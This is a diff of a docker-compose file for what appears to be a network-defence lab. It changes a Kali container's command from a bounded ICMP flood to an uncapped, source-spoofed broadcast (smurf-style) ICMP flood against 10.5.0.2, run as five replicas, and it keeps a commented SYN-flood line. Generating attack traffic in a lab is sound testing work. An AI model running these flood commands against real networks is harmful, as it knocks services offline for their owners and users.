@@ -48,7 +48,7 @@ services:
     image: ${BASE:-cyd}-kali
     # ICMPv4 Flood Attack 
     #command: hping3 10.5.0.2 -q -n -d 120 -S -p 80 --flood --rand-source
-    command: hping3 10.5.0.2 --flood --rand-source --icmp -c 25000
+    command: hping3 -a 10.5.0.2 10.5.255.255 --rand-source --flood --icmp
     deploy:
       replicas: 5
     networks:
